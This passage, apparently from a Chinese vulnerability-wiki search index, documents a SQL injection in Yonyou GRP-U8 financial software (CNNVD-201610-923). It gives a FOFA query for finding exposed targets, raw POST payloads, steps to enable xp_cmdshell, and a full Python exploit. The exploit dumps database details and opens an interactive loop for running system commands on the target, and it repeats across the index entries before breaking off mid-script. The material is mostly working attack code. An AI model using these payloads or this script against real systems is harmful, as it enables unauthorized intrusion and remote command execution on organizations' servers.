POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BGRP-U8%E8%A1%8C%E6%94%BF%E4%BA%8B%E4%B8%9A%E8%B4%A2%E5%8A%A1%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6%20SQL%E6%B3%A8%E5%85%A5%20CNNVD-201610-923/","text":"\u7528\u53cbGRP-U8\u884c\u653f\u4e8b\u4e1a\u8d22\u52a1\u7ba1\u7406\u8f6f\u4ef6 SQL\u6ce8\u5165 CNNVD-201610-923 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u7528\u53cbGRP-u8\u5b58\u5728XXE\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u6e90\u4e8e\u5e94\u7528\u7a0b\u5e8f\u89e3\u6790XML\u8f93\u5165\u65f6\u6ca1\u6709\u8fdb\u5236\u5916\u90e8\u5b9e\u4f53\u7684\u52a0\u8f7d\uff0c\u5bfc\u81f4\u53ef\u52a0\u8f7d\u5916\u90e8SQL\u8bed\u53e5\uff0c\u4ee5\u53ca\u547d\u4ee4\u6267\u884c \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] \u7528\u53cbGRP-U8\u884c\u653f\u4e8b\u4e1a\u5185\u63a7\u7ba1\u7406\u8f6f\u4ef6\uff08\u65b0\u653f\u5e9c\u4f1a\u8ba1\u5236\u5ea6\u4e13\u7248\uff09 FOFA \u00b6 [!NOTE] title=\"\u7528\u53cbGRP-U8\u884c\u653f\u4e8b\u4e1a\u5185\u63a7\u7ba1\u7406\u8f6f\u4ef6\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6f0f\u6d1e\u5229\u7528POC\u8bf7\u6c42\u5305 POST /Proxy HTTP/1.1 Accept: Accept: */* Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;) Host: host Content-Length: 357 Connection: Keep-Alive Cache-Control: no-cache cVer=9.8.0 & dp= <?xml version=\"1.0\" encoding=\"GB2312\"?> <R9PACKET version= \"1\" ><DATAFORMAT> XML </DATAFORMAT><R9FUNCTION> <NAME> AS_DataRequest </NAME><PARAMS><PARAM> <NAME> ProviderName </NAME><DATA format= \"text\" > DataSetProviderData </DATA></PARAM><PARAM> <NAME> Data </NAME><DATA format= \"text\" > select @@version </DATA></PARAM></PARAMS> </R9FUNCTION></R9PACKET> \u8bf7\u6c42\u540e\u6309F12\u67e5\u770b\u6e90\u4ee3\u7801\u53ef\u4ee5\u5f97\u5230SQL\u8bed\u53e5\u67e5\u8be2\u7ed3\u679c \u4e5f\u53ef\u4ee5\u8c03\u7528 xp_cmdshell \u6765\u6267\u884c\u7cfb\u7edf\u547d\u4ee4(\u5927\u90e8\u5206\u6b64\u7cfb\u7edf\u4e3a**windows**) [!NOTE] \u6ce8\u610f\uff1a\u5927\u90e8\u5206\u9ed8\u8ba4\u662f\u4e0d\u5f00\u542f xp_cmdshell \u6a21\u5757\u7684 \u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u65b9\u6cd5\u6253\u5f00**xp_cmdshell\u65b9\u6cd5** \u5c06\u5982\u4e0bPOST\u6570\u636e\u6309\u987a\u5e8f\u53d1\u9001( \u6ce8\u610f master \u6539\u4e3a\u5f53\u524d\u6570\u636e\u5e93\u540d ) cVer=9.8.0 & dp= <?xml version=\"1.0\" encoding=\"GB2312\"?> <R9PACKET version= \"1\" ><DATAFORMAT> XML </DATAFORMAT><R9FUNCTION><NAME> AS_DataRequest </NAME><PARAMS><PARAM><NAME> ProviderName </NAME><DATA format= \"text\" > DataSetProviderData </DATA></PARAM><PARAM><NAME> Data </NAME><DATA format= \"text\" > use master </DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET> cVer=9.8.0 & dp= <?xml version=\"1.0\" encoding=\"GB2312\"?> <R9PACKET version= \"1\" ><DATAFORMAT> XML </DATAFORMAT><R9FUNCTION><NAME> AS_DataRequest </NAME><PARAMS><PARAM><NAME> ProviderName </NAME><DATA format= \"text\" > DataSetProviderData </DATA></PARAM><PARAM><NAME> Data </NAME><DATA format= \"text\" > exec sp_configure 'show advanced options',1 </DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET> cVer=9.8.0 & dp= <?xml version=\"1.0\" encoding=\"GB2312\"?> <R9PACKET version= \"1\" ><DATAFORMAT> XML </DATAFORMAT><R9FUNCTION><NAME> AS_DataRequest </NAME><PARAMS><PARAM><NAME> ProviderName </NAME><DATA format= \"text\" > DataSetProviderData </DATA></PARAM><PARAM><NAME> Data </NAME><DATA format= \"text\" > reconfigure </DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET> cVer=9.8.0 & dp= <?xml version=\"1.0\" encoding=\"GB2312\"?> <R9PACKET version= \"1\" ><DATAFORMAT> XML </DATAFORMAT><R9FUNCTION><NAME> AS_DataRequest </NAME><PARAMS><PARAM><NAME> ProviderName </NAME><DATA format= \"text\" > DataSetProviderData </DATA></PARAM><PARAM><NAME> Data </NAME><DATA format= \"text\" > exec sp_configure 'xp_cmdshell',1 </DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET> cVer=9.8.0 & dp= <?xml version=\"1.0\" encoding=\"GB2312\"?> <R9PACKET version= \"1\" ><DATAFORMAT> XML </DATAFORMAT><R9FUNCTION><NAME> AS_DataRequest </NAME><PARAMS><PARAM><NAME> ProviderName </NAME><DATA format= \"text\" > DataSetProviderData </DATA></PARAM><PARAM><NAME> Data </NAME><DATA format= \"text\" > reconfigure </DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET> [!NOTE] \u53d1\u9001\u5982\u4e0a\u5b9e\u9645\u4e3a\u6267\u884cSQL\u8bed\u53e5\u6253\u5f00 xp_cmdshell use master; exec sp_configure 'show advanced options',1; reconfigure; exec sp_configure 'xp_cmdshell',1; reconfigure; \u518d\u53d1\u9001\u4ee5\u4e0b\u6570\u636e\u53ef\u6210\u529f\u4f7f\u7528(\u4e5f\u53ef\u80fd\u5931\u8d25) cVer=9.8.0 & dp= <?xml version=\"1.0\" encoding=\"GB2312\"?> <R9PACKET version= \"1\" ><DATAFORMAT> XML </DATAFORMAT><R9FUNCTION><NAME> AS_DataRequest </NAME><PARAMS><PARAM><NAME> ProviderName </NAME><DATA format= \"text\" > DataSetProviderData </DATA></PARAM><PARAM><NAME> Data </NAME><DATA format= \"text\" > exec xp_cmdshell \"whoami\" </DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET> [!NOTE] \u6267\u884c\u8fc7\u7a0b\u4e2d\u62a5\u9519 java.sql.SQLException\u3010\u9519\u8bef\u4ee3\u7801: 0; \u76f8\u5173\u4fe1\u606f:xxxxxx\u3011\u4e0d\u7528\u7406\u4f1a \u53d1\u9001\u8bf7\u6c42\u540e\u518d\u4f7f\u7528\u6b64\u6a21\u5757\u5219\u4f1a\u6210\u529f\u8bf7\u6c42\u6267\u884c\u7cfb\u7edf\u547d\u4ee4 \u6f0f\u6d1e\u5229\u7528POC \u00b6 #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import re import sys def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u7528\u53cbGRP-U8\u884c\u653f\u4e8b\u4e1a\u5185\u63a7\u7ba1\u7406\u8f6f\u4ef6 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 CNNVD-201610-923.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36m(Y/N) >>> Y or N \\033 [0m' ) print ( '+ \\033 [36mcmd >>> ipconfig \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): check_url = target_url + \"/Proxy\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" } data = \"\"\"cVer=9.8.0&dp=<?xml version=\"1.0\" encoding=\"GB2312\"?><R9PACKET version=\"1\"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format=\"text\">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format=\"text\">select 1,user,db_name(),host_name(),@@version</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>\"\"\" try : print ( \" \\033 [32m[o] \u6b63\u5728\u6267\u884cSQL\u8bed\u53e5:select 1,user,db_name(),host_name(),@@version... \\033 [0m\" ) response = requests . post ( url = check_url , headers = headers , data = data , timeout = 10 ) row_1 = '<ROW COLUMN1=\"1\"' row_2 = r 'COLUMN2=\"(.*?)\"' row_3 = r 'COLUMN3=\"(.*?)\"' row_4 = r 'COLUMN4=\"(.*?)\"' row_5 = r 'COLUMN5=\"(.*?)\"' if row_1 in response . text and \"\u670d\u52a1\u5668\u9519\u8bef\u4fe1\u606f\uff1anull\" not in response . text : db_user = re . findall ( row_2 , response . text )[ 0 ] db_name = re . findall ( row_3 , response . text )[ 0 ] db_host = re . findall ( row_4 , response . text )[ 0 ] db_vers = re . findall ( row_5 , response . text )[ 0 ] print ( \" \\033 [32m[o] \u5b58\u5728\u6f0f\u6d1e\uff0c\u6f0f\u6d1e\u54cd\u5e94\u4e3a: \\033 [0m\" ) print ( \" \\033 [32m >> \u6570\u636e\u5e93\u7528\u6237\u4e3a: {} \\033 [0m\" . format ( db_user )) print ( \" \\033 [32m >> \u6570\u636e\u5e93\u540d\u4e3a: {} \\033 [0m\" . format ( db_name )) print ( \" \\033 [32m >> \u6570\u636e\u5e93\u4e3b\u673a\u540d\u4e3a: {} \\033 [0m\" . format ( db_host )) print ( \" \\033 [32m >> \u6570\u636e\u5e93\u7248\u672c\u4e3a: {} \\033 [0m\" . format ( db_vers )) return db_name else : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5df2\u88ab\u4fee\u590d \\033 [0m\" ) sys . exit ( 0 ) except : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) def xp_cmdshell_open ( target_url , db_name ): open_sql = [ \"use {} \" . format ( db_name ), \"exec sp_configure 'show advanced options',1\" , \"reconfigure\" , \"exec sp_configure 'xp_cmdshell',1\" , \"reconfigure\" ] num = 1 for sql in open_sql : open_url = target_url + \"/Proxy\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" } data = 'cVer=9.8.0&dp=<?xml version=\"1.0\" encoding=\"GB2312\"?><R9PACKET version=\"1\"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format=\"text\">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format=\"text\"> {} </DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>' . format ( sql ) try : print ( \" \\033 [32m[o] \u6b63\u5728\u6267\u884cSQL\u8bed\u53e5: {} ... \\033 [0m\" . format ( sql )) response = requests . post ( url = open_url , headers = headers , data = data , timeout = 10 ) num = num + 1 if num == 5 : POC_2 ( target_url , db_name ) except : print ( \" \\033 [31m[x] \u5f00\u542f xp_cmdsheall \u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) def POC_2 ( target_url , db_name ): db_name = db_name sql_cmd_url = target_url + \"/Proxy\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" } data = \"\"\"cVer=9.8.0&dp=<?xml version=\"1.0\" encoding=\"GB2312\"?><R9PACKET version=\"1\"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format=\"text\">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format=\"text\">exec xp_cmdshell \"whoami\"</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>\"\"\" try : print ( \" \\033 [32m[o] \u6b63\u5728\u6267\u884cSQL\u8bed\u53e5:exec xp_cmdshell 'whoami'... \\033 [0m\" ) response = requests . post ( url = sql_cmd_url , headers = headers , data = data , timeout = 10 ) if 'exec xp_cmdshell' in response . text : print ( \" \\033 [31m[x] \u6570\u636e\u5e93\u672a\u5f00\u542f xp_cmdshell \u6a21\u5757 \\033 [0m\" ) sqlcmd_open = str ( input ( \" \\033 [35m\u662f\u5426\u5f00\u542f xp_cmdshell \\n (Y/N) >>> \\033 [0m\" )) if sqlcmd_open == 'Y' or sqlcmd_open == 'y' : xp_cmdshell_open ( target_url , db_name ) else : print ( \" \\033 [31m[x] \u505c\u6b62\u5f00\u542f xp_cmdshell \\033 [0m\" ) sys . exit ( 0 ) else : whoami = re . findall ( r 'output=\"(.*?)\"' , response . text )[ 0 ] print ( \" \\033 [32m[o] \u6210\u529f\u6267\u884cSQL\u8bed\u53e5:exec xp_cmdshell 'whoami'... \\n >>> {} \\033 [0m\" . format ( whoami )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25: {} \\033 [0m\" . format ( e )) sys . exit ( 0 ) def POC_3 ( target_url , cmd ): vuln_url = target_url + \"/Proxy\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" } data = 'cVer=9.8.0&dp=<?xml version=\"1.0\" encoding=\"GB2312\"?><R9PACKET version=\"1\"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format=\"text\">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format=\"text\">exec xp_cmdshell \" {} \"</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>' . format ( cmd ) try : print ( \" \\033 [32m[o] \u6b63\u5728\u6267\u884cSQL\u8bed\u53e5:exec xp_cmdshell ' {} '... \\033 [0m\" . format ( cmd )) response = requests . post ( url = vuln_url , headers = headers , data = data , timeout = 10 ) data = re . findall ( r 'output=\"(.*?)\"' , response . text ) for i in data : print ( \" \\033 [32m >>> {} \\033 [0m\" . format ( i )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25: {} \\033 [0m\" . format ( e )) sys . exit ( 0 ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) db_name = POC_1 ( target_url ) POC_2 ( target_url , db_name ) while True : cmd = input ( \" \\033 [35mCmd >>> \\033 [0m\" ) if cmd == \"exit\" : sys . exit ( 0 ) else : POC_3 ( target_url , cmd )","title":"\u7528\u53cbGRP-U8\u884c\u653f\u4e8b\u4e1a\u8d22\u52a1\u7ba1\u7406\u8f6f\u4ef6 SQL\u6ce8\u5165 CNNVD-201610-923"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BGRP-U8%E8%A1%8C%E6%94%BF%E4%BA%8B%E4%B8%9A%E8%B4%A2%E5%8A%A1%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6%20SQL%E6%B3%A8%E5%85%A5%20CNNVD-201610-923/#\u7528\u53cbgrp-u8\u884c\u653f\u4e8b\u4e1a\u8d22\u52a1\u7ba1\u7406\u8f6f\u4ef6-sql\u6ce8\u5165-cnnvd-201610-923","text":"","title":"\u7528\u53cbGRP-U8\u884c\u653f\u4e8b\u4e1a\u8d22\u52a1\u7ba1\u7406\u8f6f\u4ef6 SQL\u6ce8\u5165 CNNVD-201610-923"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BGRP-U8%E8%A1%8C%E6%94%BF%E4%BA%8B%E4%B8%9A%E8%B4%A2%E5%8A%A1%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6%20SQL%E6%B3%A8%E5%85%A5%20CNNVD-201610-923/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u7528\u53cbGRP-u8\u5b58\u5728XXE\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u6e90\u4e8e\u5e94\u7528\u7a0b\u5e8f\u89e3\u6790XML\u8f93\u5165\u65f6\u6ca1\u6709\u8fdb\u5236\u5916\u90e8\u5b9e\u4f53\u7684\u52a0\u8f7d\uff0c\u5bfc\u81f4\u53ef\u52a0\u8f7d\u5916\u90e8SQL\u8bed\u53e5\uff0c\u4ee5\u53ca\u547d\u4ee4\u6267\u884c","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BGRP-U8%E8%A1%8C%E6%94%BF%E4%BA%8B%E4%B8%9A%E8%B4%A2%E5%8A%A1%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6%20SQL%E6%B3%A8%E5%85%A5%20CNNVD-201610-923/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] \u7528\u53cbGRP-U8\u884c\u653f\u4e8b\u4e1a\u5185\u63a7\u7ba1\u7406\u8f6f\u4ef6\uff08\u65b0\u653f\u5e9c\u4f1a\u8ba1\u5236\u5ea6\u4e13\u7248\uff09","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BGRP-U8%E8%A1%8C%E6%94%BF%E4%BA%8B%E4%B8%9A%E8%B4%A2%E5%8A%A1%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6%20SQL%E6%B3%A8%E5%85%A5%20CNNVD-201610-923/#fofa","text":"[!NOTE] title=\"\u7528\u53cbGRP-U8\u884c\u653f\u4e8b\u4e1a\u5185\u63a7\u7ba1\u7406\u8f6f\u4ef6\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BGRP-U8%E8%A1%8C%E6%94%BF%E4%BA%8B%E4%B8%9A%E8%B4%A2%E5%8A%A1%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6%20SQL%E6%B3%A8%E5%85%A5%20CNNVD-201610-923/#\u6f0f\u6d1e\u590d\u73b0","text":"\u6f0f\u6d1e\u5229\u7528POC\u8bf7\u6c42\u5305 POST /Proxy HTTP/1.1 Accept: Accept: */* Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;) Host: host Content-Length: 357 Connection: Keep-Alive Cache-Control: no-cache cVer=9.8.0 & dp= <?xml version=\"1.0\" encoding=\"GB2312\"?> <R9PACKET version= \"1\" ><DATAFORMAT> XML </DATAFORMAT><R9FUNCTION> <NAME> AS_DataRequest </NAME><PARAMS><PARAM> <NAME> ProviderName </NAME><DATA format= \"text\" > DataSetProviderData </DATA></PARAM><PARAM> <NAME> Data </NAME><DATA format= \"text\" > select @@version </DATA></PARAM></PARAMS> </R9FUNCTION></R9PACKET> \u8bf7\u6c42\u540e\u6309F12\u67e5\u770b\u6e90\u4ee3\u7801\u53ef\u4ee5\u5f97\u5230SQL\u8bed\u53e5\u67e5\u8be2\u7ed3\u679c \u4e5f\u53ef\u4ee5\u8c03\u7528 xp_cmdshell \u6765\u6267\u884c\u7cfb\u7edf\u547d\u4ee4(\u5927\u90e8\u5206\u6b64\u7cfb\u7edf\u4e3a**windows**) [!NOTE] \u6ce8\u610f\uff1a\u5927\u90e8\u5206\u9ed8\u8ba4\u662f\u4e0d\u5f00\u542f xp_cmdshell \u6a21\u5757\u7684 \u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u65b9\u6cd5\u6253\u5f00**xp_cmdshell\u65b9\u6cd5** \u5c06\u5982\u4e0bPOST\u6570\u636e\u6309\u987a\u5e8f\u53d1\u9001( \u6ce8\u610f master \u6539\u4e3a\u5f53\u524d\u6570\u636e\u5e93\u540d ) cVer=9.8.0 & dp= <?xml version=\"1.0\" encoding=\"GB2312\"?> <R9PACKET version= \"1\" ><DATAFORMAT> XML </DATAFORMAT><R9FUNCTION><NAME> AS_DataRequest </NAME><PARAMS><PARAM><NAME> ProviderName </NAME><DATA format= \"text\" > DataSetProviderData </DATA></PARAM><PARAM><NAME> Data </NAME><DATA format= \"text\" > use master </DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET> cVer=9.8.0 & dp= <?xml version=\"1.0\" encoding=\"GB2312\"?> <R9PACKET version= \"1\" ><DATAFORMAT> XML </DATAFORMAT><R9FUNCTION><NAME> AS_DataRequest </NAME><PARAMS><PARAM><NAME> ProviderName </NAME><DATA format= \"text\" > DataSetProviderData </DATA></PARAM><PARAM><NAME> Data </NAME><DATA format= \"text\" > exec sp_configure 'show advanced options',1 </DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET> cVer=9.8.0 & dp= <?xml version=\"1.0\" encoding=\"GB2312\"?> <R9PACKET version= \"1\" ><DATAFORMAT> XML </DATAFORMAT><R9FUNCTION><NAME> AS_DataRequest </NAME><PARAMS><PARAM><NAME> ProviderName </NAME><DATA format= \"text\" > DataSetProviderData </DATA></PARAM><PARAM><NAME> Data </NAME><DATA format= \"text\" > reconfigure </DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET> cVer=9.8.0 & dp= <?xml version=\"1.0\" encoding=\"GB2312\"?> <R9PACKET version= \"1\" ><DATAFORMAT> XML </DATAFORMAT><R9FUNCTION><NAME> AS_DataRequest </NAME><PARAMS><PARAM><NAME> ProviderName </NAME><DATA format= \"text\" > DataSetProviderData </DATA></PARAM><PARAM><NAME> Data </NAME><DATA format= \"text\" > exec sp_configure 'xp_cmdshell',1 </DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET> cVer=9.8.0 & dp= <?xml version=\"1.0\" encoding=\"GB2312\"?> <R9PACKET version= \"1\" ><DATAFORMAT> XML </DATAFORMAT><R9FUNCTION><NAME> AS_DataRequest </NAME><PARAMS><PARAM><NAME> ProviderName </NAME><DATA format= \"text\" > DataSetProviderData </DATA></PARAM><PARAM><NAME> Data </NAME><DATA format= \"text\" > reconfigure </DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET> [!NOTE] \u53d1\u9001\u5982\u4e0a\u5b9e\u9645\u4e3a\u6267\u884cSQL\u8bed\u53e5\u6253\u5f00 xp_cmdshell use master; exec sp_configure 'show advanced options',1; reconfigure; exec sp_configure 'xp_cmdshell',1; reconfigure; \u518d\u53d1\u9001\u4ee5\u4e0b\u6570\u636e\u53ef\u6210\u529f\u4f7f\u7528(\u4e5f\u53ef\u80fd\u5931\u8d25) cVer=9.8.0 & dp= <?xml version=\"1.0\" encoding=\"GB2312\"?> <R9PACKET version= \"1\" ><DATAFORMAT> XML </DATAFORMAT><R9FUNCTION><NAME> AS_DataRequest </NAME><PARAMS><PARAM><NAME> ProviderName </NAME><DATA format= \"text\" > DataSetProviderData </DATA></PARAM><PARAM><NAME> Data </NAME><DATA format= \"text\" > exec xp_cmdshell \"whoami\" </DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET> [!NOTE] \u6267\u884c\u8fc7\u7a0b\u4e2d\u62a5\u9519 java.sql.SQLException\u3010\u9519\u8bef\u4ee3\u7801: 0; \u76f8\u5173\u4fe1\u606f:xxxxxx\u3011\u4e0d\u7528\u7406\u4f1a \u53d1\u9001\u8bf7\u6c42\u540e\u518d\u4f7f\u7528\u6b64\u6a21\u5757\u5219\u4f1a\u6210\u529f\u8bf7\u6c42\u6267\u884c\u7cfb\u7edf\u547d\u4ee4","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BGRP-U8%E8%A1%8C%E6%94%BF%E4%BA%8B%E4%B8%9A%E8%B4%A2%E5%8A%A1%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6%20SQL%E6%B3%A8%E5%85%A5%20CNNVD-201610-923/#\u6f0f\u6d1e\u5229\u7528poc","text":"#!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import re import sys def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u7528\u53cbGRP-U8\u884c\u653f\u4e8b\u4e1a\u5185\u63a7\u7ba1\u7406\u8f6f\u4ef6 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 CNNVD-201610-923.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36m(Y/N) >>> Y or N \\033 [0m' ) print ( '+ \\033 [36mcmd >>> ipconfig \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): check_url = target_url + \"/Proxy\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" } data = \"\"\"cVer=9.8.0&dp=<?xml version=\"1.0\" encoding=\"GB2312\"?><R9PACKET version=\"1\"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format=\"text\">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format=\"text\">select 1,user,db_name(),host_name(),@@version</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>\"\"\" try : print ( \" \\033 [32m[o] \u6b63\u5728\u6267\u884cSQL\u8bed\u53e5:select 1,user,db_name(),host_name(),@@version... \\033 [0m\" ) response = requests . post ( url = check_url , headers = headers , data = data , timeout = 10 ) row_1 = '<ROW COLUMN1=\"1\"' row_2 = r 'COLUMN2=\"(.*?)\"' row_3 = r 'COLUMN3=\"(.*?)\"' row_4 = r 'COLUMN4=\"(.*?)\"' row_5 = r 'COLUMN5=\"(.*?)\"' if row_1 in response . text and \"\u670d\u52a1\u5668\u9519\u8bef\u4fe1\u606f\uff1anull\" not in response . text : db_user = re . findall ( row_2 , response . text )[ 0 ] db_name = re . findall ( row_3 , response . text )[ 0 ] db_host = re . findall ( row_4 , response . text )[ 0 ] db_vers = re . findall ( row_5 , response . text )[ 0 ] print ( \" \\033 [32m[o] \u5b58\u5728\u6f0f\u6d1e\uff0c\u6f0f\u6d1e\u54cd\u5e94\u4e3a: \\033 [0m\" ) print ( \" \\033 [32m >> \u6570\u636e\u5e93\u7528\u6237\u4e3a: {} \\033 [0m\" . format ( db_user )) print ( \" \\033 [32m >> \u6570\u636e\u5e93\u540d\u4e3a: {} \\033 [0m\" . format ( db_name )) print ( \" \\033 [32m >> \u6570\u636e\u5e93\u4e3b\u673a\u540d\u4e3a: {} \\033 [0m\" . format ( db_host )) print ( \" \\033 [32m >> \u6570\u636e\u5e93\u7248\u672c\u4e3a: {} \\033 [0m\" . format ( db_vers )) return db_name else : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5df2\u88ab\u4fee\u590d \\033 [0m\" ) sys . exit ( 0 ) except : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) def xp_cmdshell_open ( target_url , db_name ): open_sql = [ \"use {} \" . format ( db_name ), \"exec sp_configure 'show advanced options',1\" , \"reconfigure\" , \"exec sp_configure 'xp_cmdshell',1\" , \"reconfigure\" ] num = 1 for sql in open_sql : open_url = target_url + \"/Proxy\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" } data = 